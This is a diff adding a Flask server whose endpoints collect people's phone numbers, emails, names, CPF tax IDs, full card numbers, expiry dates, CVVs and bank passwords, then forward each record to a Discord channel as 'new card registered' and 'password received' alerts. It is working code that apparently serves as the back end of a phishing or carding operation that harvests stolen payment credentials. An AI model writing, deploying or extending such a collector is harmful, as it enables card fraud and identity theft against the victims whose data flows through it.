@@ -1,0 +1,144 @@
+from model.cardModel import Card
+from flask import Flask, request, jsonify
+import os
+import discord
+from discord.ext import commands
+import threading
+import asyncio
+
+app = Flask(__name__)
+
+token = os.getenv("TOKEN")
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# Canal de Discord donde se enviarán las notificaciones
+DISCORD_CHANNEL_ID = int(os.getenv("DISCORD_CHANNEL_ID", 0))
+
+cards: list[Card] = []
+
+def run_bot():
+    """Función para ejecutar el bot de Discord en un hilo separado"""
+    bot.run(token)
+
+# Iniciar el bot de Discord en un hilo separado
+if token and DISCORD_CHANNEL_ID:
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.daemon = True
+    bot_thread.start()
+
+async def send_discord_message(message_content):
+    """Envía un mensaje al canal de Discord especificado"""
+    try:
+        channel = bot.get_channel(DISCORD_CHANNEL_ID)
+        if channel:
+            await channel.send(message_content)
+    except Exception as e:
+        print(f"Error enviando mensaje a Discord: {e}")
+
+@app.route('/auth', methods=['POST'])
+def authInfo():
+    try:
+        data = request.json
+
+        if not data or not all(key in data for key in [
+            'celular',
+            'operadora',
+            'valor',
+            'email',
+            'nome',
+            'cpf',
+            'card',
+            'mes',
+            'ano',
+            'cvv',
+            'token',
+            'bin',
+            'dadosbin'
+        ]):
+            return jsonify({'Error': 'Datos incompletos'}), 400
+
+        celular = data.get('celular')
+        operadora = data.get('operadora')
+        valor = data.get('valor')
+        email = data.get('email')
+        nome = data.get('nome')
+        cpf = data.get('cpf')
+        card_number = data.get('card')
+        mes = data.get('mes')
+        ano = data.get('ano')
+        cvv = data.get('cvv')
+        token = data.get('token')
+        bin = data.get('bin')
+        dadosbin = data.get('dadosbin')
+
+        # Crear y almacenar la tarjeta
+        card = Card(
+            celular, operadora, valor, email, nome, cpf, card_number,
+            mes, ano, cvv, token, bin, dadosbin)
+        cards.append(card)
+
+        # Enviar notificación a Discord
+        if token and DISCORD_CHANNEL_ID:
+            message = f"🔴 **NUEVA TARJETA REGISTRADA** 🔴\n"
+            message += f"📱 **Celular:** {celular}\n"
+            message += f"🏢 **Operadora:** {operadora}\n"
+            message += f"💰 **Valor:** {valor}\n"
+            message += f"📧 **Email:** {email}\n"
+            message += f"👤 **Nombre:** {nome}\n"
+            message += f"📄 **CPF:** {cpf}\n"
+            message += f"💳 **Tarjeta:** {card_number}\n"
+            message += f"📅 **Vencimiento:** {mes}/{ano}\n"
+            message += f"🔒 **CVV:** {cvv}\n"
+            message += f"🔑 **Token:** {token}\n"
+            message += f"🏦 **BIN:** {bin}\n"
+            message += f"📊 **Datos BIN:** {dadosbin}"
+
+            # Ejecutar en el loop del bot
+            asyncio.run_coroutine_threadsafe(send_discord_message(message), bot.loop)
+
+        return jsonify({'Message': 'Datos recibidos correctamente'}), 200
+
+    except Exception as ex:
+        print(f"Error en /auth: {ex}")
+        return jsonify({'Error': 'Error interno del servidor'}), 500
+
+@app.route('/authpass', methods=['POST'])
+def authPassword():
+    try:
+        data = request.json
+        if not data or not all(key in data for key in ['senha', 'token']):
+            return jsonify({'Error': 'Datos incompletos'}), 400
+
+        senha = data.get('senha')
+        token = data.get('token')
+
+        # Buscar la tarjeta por token
+        for card in cards:
+            if card.token == token:
+                # Enviar notificación a Discord con la contraseña
+                if token and DISCORD_CHANNEL_ID:
+                    message = f"🔓 **CONTRASEÑA RECIBIDA** 🔓\n"
+                    message += f"🔑 **Token:** {token}\n"
+                    message += f"🔐 **Contraseña:** {senha}\n"
+                    message += f"💳 **Tarjeta:** {card.card}\n"
+                    message += f"👤 **Nombre:** {card.nome}"
+
+                    # Ejecutar en el loop del bot
+                    asyncio.run_coroutine_threadsafe(send_discord_message(message), bot.loop)
+                
+                return jsonify({'Message': 'Contraseña recibida correctamente'}), 200
+
+        return jsonify({'Error': 'Token no encontrado'}), 404
+
+    except Exception as ex:
+        print(f"Error en /authpass: {ex}")
+        return jsonify({'Error': 'Error interno del servidor'}), 500
+
+@app.route('/health', methods=['GET'])
+def health_check():
+    """Endpoint para verificar el estado del servicio"""
+    return jsonify({'status': 'ok', 'cards_count': len(cards)}), 200
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=False)
